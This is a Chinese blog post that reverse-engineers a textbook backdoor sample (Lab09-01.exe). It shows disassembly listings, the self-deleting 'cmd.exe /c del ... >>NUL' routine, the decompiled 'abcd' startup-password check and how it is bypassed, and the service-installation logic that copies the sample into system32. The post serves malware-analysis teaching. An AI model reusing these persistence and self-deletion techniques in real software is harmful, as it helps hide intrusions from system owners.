+        <time datetime="2021-12-10T07:28:10.000Z" itemprop="datePublished">2021-12-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/">木马分析</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%90%8E%E9%97%A8/" rel="tag">后门</a>, <a class="tag-link-link" href="/tags/%E7%97%85%E6%AF%92/" rel="tag">病毒</a>
+    </div>
+
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>本文首发于跳跳糖社区，原文链接: <a target="_blank" rel="noopener" href="https://tttang.com/archive/1342/">https://tttang.com/archive/1342/</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>样本地址：<a target="_blank" rel="noopener" href="https://github.com/0range-x/Virus-sample/blob/master/Chapter_9L/Lab09-01.exe">https://github.com/0range-x/Virus-sample/blob/master/Chapter_9L/Lab09-01.exe</a><br>是书中的一个案例样本，木马加了启动参数，还有启动密码，尝试分析木马的功能和行为</p>
+<p>首先crack掉木马的启动密码，根据不同的启动参数分析木马的不同功能，最终建立socket通信。</p>
+<h2 id="0x01-大致浏览"><a href="#0x01-大致浏览" class="headerlink" title="0x01 大致浏览"></a>0x01 大致浏览</h2><p>按照惯例，先看下导入表，有很多导入函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OpenSCManagerA：建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</span><br><span class="line">OpenServiceA: 打开一个已存在的服务</span><br><span class="line">ChangeServiceConfigA：更改服务的配置参数</span><br><span class="line">CloseServiceHandle：关闭指向服务控制管理对象的句柄，也可能是指向服务对象的句柄</span><br><span class="line">CreateServiceA：创建服务对象并将其添加到指定的服务控制管理器数据库</span><br><span class="line">RegDeleteValueA：删除注册表中的键值</span><br><span class="line">RegCreateKeyExA：创建指定的注册表项。如果键已经存在，函数将打开它</span><br><span class="line">RegSetValueExA：设置注册表键值的数据和类型</span><br><span class="line">RegOpenKeyExA：打开指定的注册表项</span><br><span class="line">RegQueryValueExA：检索与开放注册表键关联的指定值名称的类型和数据。与RegOpenKeyExA功能类似</span><br><span class="line">DeleteService：从服务控制管理器数据库中删除的指定服务</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:0040101B                 call    ds:RegOpenKeyExA</span><br><span class="line">.text:0040103A                 call    ds:RegQueryValueExA</span><br><span class="line">.text:0040104D                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004011A8                 call    ds:RegCreateKeyExA</span><br><span class="line">.text:004011D5                 call    ds:RegSetValueExA</span><br><span class="line">.text:004011E6                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:00401233                 call    ds:RegCreateKeyExA</span><br><span class="line">.text:0040124D                 call    ds:RegDeleteValueA</span><br><span class="line">.text:00401260                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004012AE                 call    ds:RegOpenKeyExA</span><br><span class="line">.text:004012DD                 call    ds:RegQueryValueExA</span><br><span class="line">.text:004012F9                 call    ds:CloseHandle</span><br><span class="line"></span><br><span class="line">.text:004014FC                 call    ds:CreateFileA</span><br><span class="line">.text:00401525                 call    ds:GetFileTime</span><br><span class="line"></span><br><span class="line">.text:00401560                 call    ds:CreateFileA</span><br><span class="line">.text:00401579                 call    ds:SetFileTime</span><br><span class="line"></span><br><span class="line">.text:004015C8                 call    ds:GetSystemDirectoryA</span><br><span class="line"></span><br><span class="line">.text:0040165E                 call    ds:WSAStartup</span><br><span class="line">.text:00401676                 call    ds:gethostbyname</span><br><span class="line">.text:0040168B                 call    ds:WSACleanup</span><br><span class="line">.text:004016A1                 call    ds:socket</span><br><span class="line">.text:004016B4                 call    ds:WSACleanup</span><br><span class="line">.text:004016E2                 call    ds:htons</span><br><span class="line">.text:004016FE                 call    ds:connect</span><br><span class="line">.text:0040170F                 call    ds:closesocket</span><br><span class="line">.text:0040171E                 call    ds:WSACleanup</span><br><span class="line"></span><br><span class="line">.text:004017FA                 call    ds:send</span><br><span class="line"></span><br><span class="line">.text:004018B8                 call    ds:CreateFileA</span><br><span class="line">.text:00401906                 call    ds:ReadFile</span><br><span class="line">.text:00401910                 call    ds:GetLastError</span><br><span class="line"></span><br><span class="line">.text:00401A65                 call    ds:recv</span><br><span class="line">.text:00401A84                 call    ds:WriteFile</span><br><span class="line"></span><br><span class="line">.text:004020C7                 call    ds:Sleep</span><br><span class="line"></span><br><span class="line">.text:004026CC                 call    ds:OpenSCManagerA</span><br><span class="line">.text:004026FB                 call    ds:OpenServiceA</span><br><span class="line">.text:00402730                 call    ds:ChangeServiceConfigA</span><br><span class="line">.text:00402741                 call    ds:CloseServiceHandle</span><br><span class="line">.text:0040285E                 call    ds:ExpandEnvironmentStringsA</span><br><span class="line">.text:00402880                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:004028A1                 call    ds:CopyFileA</span><br><span class="line"></span><br><span class="line">.text:00402915                 call    ds:OpenSCManagerA</span><br><span class="line">.text:00402977                 call    ds:DeleteService</span><br><span class="line">.text:00402988                 call    ds:CloseServiceHandl</span><br><span class="line"></span><br><span class="line">.text:00405683                 call    ds:HeapReAlloc</span><br><span class="line">.text:00408367                 call    ebp ; VirtualAllo</span><br><span class="line">.text:00408428                 call    ds:VirtualFree</span><br><span class="line">.text:0040843F                 call    ds:HeapFree</span><br></pre></td></tr></table></figure>
+
+<p>ok，大概找一下这些函数的位置，为后面做准备</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095315886.png" alt="image-20211116095315886"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShellExecuteA: 运行一个外部程序，或者打开一个已注册的文件、打开一个目录、打印文件等等功能，它可以打开电脑内的任何文件，也可以打开URL</span><br></pre></td></tr></table></figure>
+
+<p>下面的函数已经老生常谈了，建立socket通信使用</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095433324.png" alt="image-20211116095433324"></p>
+<p>大概猜测一下，这个程序做了什么呢？创建服务，修改注册表，建立通信，应该是个后门。</p>
+<h2 id="0x02-详细分析"><a href="#0x02-详细分析" class="headerlink" title="0x02 详细分析"></a>0x02 详细分析</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>找到main函数</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117094657231.png" alt="image-20211117094657231"></p>
+<p>先拖到od里面</p>
+<p>emmm？竟然是从<code>403896</code>开始？再看下调用堆栈，很明显，这里不是程序真正的入口，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111303286.png" alt="image-20211116111303286"></p>
+<p>直到 <code>403945</code>处，显示终止，那么回去重新看</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111511180.png" alt="image-20211116111511180"></p>
+<p>在ida中发现它是对main函数的调用</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111640282.png" alt="image-20211116111640282"></p>
+<p>回到od，接着F7，step in -&gt; 单步步入</p>
+<p>来到这里，继续F7+F8一步步分析</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111836468.png" alt="image-20211116111836468"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095143083.png" alt="image-20211117095143083"></p>
+<p>f7单步进入 <code>403945</code></p>
+<p>这里才是函数的入口</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095438337.png" alt="image-20211117095438337"></p>
+<p>一步步看，F8，step-&gt;over，往上看看</p>
+<p>前面主要是一些传参，push 字符串入栈</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112158064.png" alt="image-20211116112158064"></p>
+<p>到<code>402AFD</code>处，对比arg(命令行参数的数量)是否为1，因为我们这里前面并没有指定任何参数，所以这里不跳转，继续执行，并且跳转到<code>401000</code>处</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112320840.png" alt="image-20211116112320840"></p>
+<p>ok，回到前面<code>402AFD</code>处继续向下分析</p>
+<p><code>402B08</code>这里，执行<code>test eax,eax</code>，检测eax的值是不是0，因为前面 <code>xor eax,eax</code>后，所以eax是0，这里成功跳转到 <code>402410</code></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116114057640.png" alt="image-20211116114057640"></p>
+<p>因为这个函数比较长，无法完整截图，所以这里贴上代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.text:00402410                 push    ebp</span><br><span class="line">.text:00402411                 mov     ebp, esp</span><br><span class="line">.text:00402413                 sub     esp, 208h</span><br><span class="line">.text:00402419                 push    ebx</span><br><span class="line">.text:0040241A                 push    esi</span><br><span class="line">.text:0040241B                 push    edi</span><br><span class="line">.text:0040241C                 push    104h            ; nSize</span><br><span class="line">.text:00402421                 lea     eax, [ebp+Filename]</span><br><span class="line">.text:00402427                 push    eax             ; lpFilename</span><br><span class="line">.text:00402428                 push    0               ; hModule</span><br><span class="line">.text:0040242A                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:00402430                 push    104h            ; cchBuffer</span><br><span class="line">.text:00402435                 lea     ecx, [ebp+Filename]</span><br><span class="line">.text:0040243B                 push    ecx             ; lpszShortPath</span><br><span class="line">.text:0040243C                 lea     edx, [ebp+Filename]</span><br><span class="line">.text:00402442                 push    edx             ; lpszLongPath</span><br><span class="line">.text:00402443                 call    ds:GetShortPathNameA</span><br><span class="line">.text:00402449                 mov     edi, offset aCDel ; &quot;/c del &quot;</span><br><span class="line">.text:0040244E                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:00402454                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402457                 xor     eax, eax</span><br><span class="line">.text:00402459                 repne scasb</span><br><span class="line">.text:0040245B                 not     ecx</span><br><span class="line">.text:0040245D                 sub     edi, ecx</span><br><span class="line">.text:0040245F                 mov     esi, edi</span><br><span class="line">.text:00402461                 mov     eax, ecx</span><br><span class="line">.text:00402463                 mov     edi, edx</span><br><span class="line">.text:00402465                 shr     ecx, 2</span><br><span class="line">.text:00402468                 rep movsd</span><br><span class="line">.text:0040246A                 mov     ecx, eax</span><br><span class="line">.text:0040246C                 and     ecx, 3</span><br><span class="line">.text:0040246F                 rep movsb</span><br><span class="line">.text:00402471                 lea     edi, [ebp+Filename]</span><br><span class="line">.text:00402477                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:0040247D                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402480                 xor     eax, eax</span><br><span class="line">.text:00402482                 repne scasb</span><br><span class="line">.text:00402484                 not     ecx</span><br><span class="line">.text:00402486                 sub     edi, ecx</span><br><span class="line">.text:00402488                 mov     esi, edi</span><br><span class="line">.text:0040248A                 mov     ebx, ecx</span><br><span class="line">.text:0040248C                 mov     edi, edx</span><br><span class="line">.text:0040248E                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:00402491                 xor     eax, eax</span><br><span class="line">.text:00402493                 repne scasb</span><br><span class="line">.text:00402495                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:00402498                 mov     ecx, ebx</span><br><span class="line">.text:0040249A                 shr     ecx, 2</span><br><span class="line">.text:0040249D                 rep movsd</span><br><span class="line">.text:0040249F                 mov     ecx, ebx</span><br><span class="line">.text:004024A1                 and     ecx, 3</span><br><span class="line">.text:004024A4                 rep movsb</span><br><span class="line">.text:004024A6                 mov     edi, offset aNul ; &quot; &gt;&gt; NUL&quot;</span><br><span class="line">.text:004024AB                 lea     edx, [ebp+Parameters]</span><br><span class="line">.text:004024B1                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024B4                 xor     eax, eax</span><br><span class="line">.text:004024B6                 repne scasb</span><br><span class="line">.text:004024B8                 not     ecx</span><br><span class="line">.text:004024BA                 sub     edi, ecx</span><br><span class="line">.text:004024BC                 mov     esi, edi</span><br><span class="line">.text:004024BE                 mov     ebx, ecx</span><br><span class="line">.text:004024C0                 mov     edi, edx</span><br><span class="line">.text:004024C2                 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:004024C5                 xor     eax, eax</span><br><span class="line">.text:004024C7                 repne scasb</span><br><span class="line">.text:004024C9                 add     edi, 0FFFFFFFFh</span><br><span class="line">.text:004024CC                 mov     ecx, ebx</span><br><span class="line">.text:004024CE                 shr     ecx, 2</span><br><span class="line">.text:004024D1                 rep movsd</span><br><span class="line">.text:004024D3                 mov     ecx, ebx</span><br><span class="line">.text:004024D5                 and     ecx, 3</span><br><span class="line">.text:004024D8                 rep movsb</span><br><span class="line">.text:004024DA                 push    0               ; nShowCmd</span><br><span class="line">.text:004024DC                 push    0               ; lpDirectory</span><br><span class="line">.text:004024DE                 lea     eax, [ebp+Parameters]</span><br><span class="line">.text:004024E4                 push    eax             ; lpParameters</span><br><span class="line">.text:004024E5                 push    offset File     ; &quot;cmd.exe&quot;</span><br><span class="line">.text:004024EA                 push    0               ; lpOperation</span><br><span class="line">.text:004024EC                 push    0               ; hwnd</span><br><span class="line">.text:004024EE                 call    ds:ShellExecuteA</span><br><span class="line">.text:004024F4                 push    0               ; Code</span><br><span class="line">.text:004024F6                 call    _exit</span><br><span class="line">.text:004024F6 sub_402410      endp</span><br></pre></td></tr></table></figure>
+
+<p>看到它调用<code>GetModuleFileNameA</code>获取当前可执行文件的路径，接着调用<code>GetShortPathNameA</code>函数获取缩写的全路径字符串，构造完整的字符串即<code>/c del path-to-executable &gt;&gt;NUL</code>，下面调用<code>ShellExecuteA</code>函数打开cmd命令行，参数是前面构造的字符串，即从硬盘中删除自己。因为在od中已经打开了该文件，当然是删除失败的。</p>
+<p>因为<code>filename</code>在栈空间，载入内存才直到它是什么。</p>
+<p>先找到 <code>ebp</code>寄存器的地址，再减去<code>208h</code></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117104049309.png" alt="image-20211117104049309"></p>
+<p>但是因为我对od使用不熟悉，ebp没有找到有用的东西。™的在ecx中找到了…，其实也可以对应上，调用<code>GetModuleFilenameA</code>后，<code>filename</code>会赋值给<code>ecx</code>，也算是找到了当前路径。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117110341950.png"></p>
+<p>那就可以结合ida中的字符串，拼接一下<code>cmd.exe /c del c:\Users\adninistrator\Desktop\BinaryCollection\Chapter_9L\Lab09-01-cracked.exe&gt;&gt;NUL</code>  即删除自身</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117113544736.png" alt="image-20211117113544736"></p>
+<table>
+<thead>
+<tr>
+<th>命令行选项</th>
+<th>地址</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-in</td>
+<td>0x402600</td>
+<td>安装服务</td>
+</tr>
+<tr>
+<td>-re</td>
+<td>0x402900</td>
+<td>卸载服务</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>0x401070</td>
+<td>设置注册表配置键</td>
+</tr>
+<tr>
+<td>-cc</td>
+<td>0x401280</td>
+<td>打印注册表配置键</td>
+</tr>
+</tbody></table>
+<p>在main函数中，不难找到几处对<code>__mbscmp</code>函数的调用，整理下该函数调用的参数</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117111630925.png" alt="image-20211117111630925"></p>
+<h3 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h3><p>下一步应该是为了让这个程序能正常运行。这里给程序启动添加个参数，使其正常运行。修改注册表的代码路径应该也是可以的，但是修改注册表属于高危操作，很容易产生意外后果，所以这里先添加启动参数试试，这样就满足了<code>402AFD</code>的cmp，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121130243.png" alt="image-20211116121130243"></p>
+<p>添加 <code>-in</code>参数试试，这里为什么添加 <code>-in</code>参数，可以跳转到 <code>0x03 命令行分析</code>处</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121243071.png" alt="image-20211116121243071"></p>
+<p>看到还是会跳到 <code>402410</code>，尝试删除自己，那说明我们添加的参数没起作用啊</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121949288.png" alt="image-20211116121949288"></p>
+<p>在<code>402B2E</code>处，最后一个命令行参数被传入到 <code>402510</code>处，这是最后一个参数，因为C程序的main函数只有两个参数: argc和argv，argc是参数的个数，argv是指向命令行参数的一个指针。EAX包含argc，ECX包含argv。在<code>402B23</code>处，<code>ecx+eax*4-4</code>这个指针选择命令行参数数组中的最后一个元素，最后在 eax中，并且在函数调用之前push入栈</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116143954688.png" alt="image-20211116143954688"></p>
+<p>接着往下，来到<code>402B2E</code>处，函数调用 <code>402510</code></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116145310014.png" alt="image-20211116145310014"></p>
+<p>在ida中看看，很奇怪，这里没有函数调用，只有一系列算术操作。<code>add/xor/cmp/</code>，检查输入得到是否是4个字符，如果是的话，跳转到<code>40252D</code>处，而这里，又开始和字符‘a’进行比较，顺着往下全面分析的话，可以看出它检验输入的字符是不是 <code>abcd</code>，很明显，这里做了密码校验。到这里就可以猜测，添加了命令行参数仍然跳转的原因，因为做了密码校验。</p>
+<p>f5看下反汇编，这里我就直接贴代码了</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL __cdecl <span class="title">sub_402510</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a1) != <span class="number">4</span> )				<span class="comment">//校验4位长度</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)a1 != <span class="number">97</span> )							<span class="comment">//a</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = *(_BYTE *)(a1 + <span class="number">1</span>) - *(_BYTE *)a1;			<span class="comment">//b</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">99</span> * v2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == *(<span class="keyword">char</span> *)(a1 + <span class="number">2</span>) )					<span class="comment">//c</span></span><br><span class="line">    result = (<span class="keyword">char</span>)(v3 + <span class="number">1</span>) == *(<span class="keyword">char</span> *)(a1 + <span class="number">3</span>);	<span class="comment">//d</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>进入<code>402510</code>调试</p>
+<p>可以看到返回值是0，因为密码校验错误嘛，输入的不是 abcd，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117114542540.png" alt="image-20211117114542540"></p>
+<p>这里直接修改寄存器的返回值，</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115033632.png" alt="image-20211117115033632"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115200115.png" alt="image-20211117115200115"></p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115243204.png" alt="image-20211117115243204"></p>
+<p>接着看 在调用<code>GetModuleFileNameA</code>后，接着调用了<code>splitpath</code>函数来获取当前文件路径</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117145158822.png" alt="image-20211117145158822"></p>
+<p>接着往下，<code>alloca_probe</code>是在栈空间申请内存的函数，<code>sub_4025B0</code>我们知道是一个截取文件路径的函数，<code>402632</code>看来是先取一下<code>system32</code>目录。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117150722663.png" alt="image-20211117150722663"></p>
+<p>继续续调试，进入 <code>4026cc</code>，来ida中看</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172953326.png" alt="image-20211116172953326"></p>
+<p>调用<code>OpenSCManagerA</code>，打开一个服务管理器，创建一个服务，并添加进启动项，并且将自己复制到 <code>%SYSTEMROOT%\\system32\\xxx</code>，即写进system32目录</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173821127.png" alt="image-20211116173821127"></p>
+<p>要想知道启动的什么服务的话，只能在内存中看，这里很明显，启动的服务是自己</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117152044299.png" alt="image-20211117152044299"></p>
+<p>接着在下面调用<code>ChangeServiceConfigA</code>函数，可以看下它的参数。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153003646.png" alt="image-20211117153003646"></p>
+<p>接着跳着就跳出了main函数，就shutdown了？？ 这里注意到，这些函数只是打开并且安装服务，但是并没有创建服务，因为我们没找到<code>CreateServiceA</code>函数，按理来说创建服务的话，应该都是有这个函数的。</p>
+<p><img src="/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153851502.png" alt="image-20211117153851502"></p>
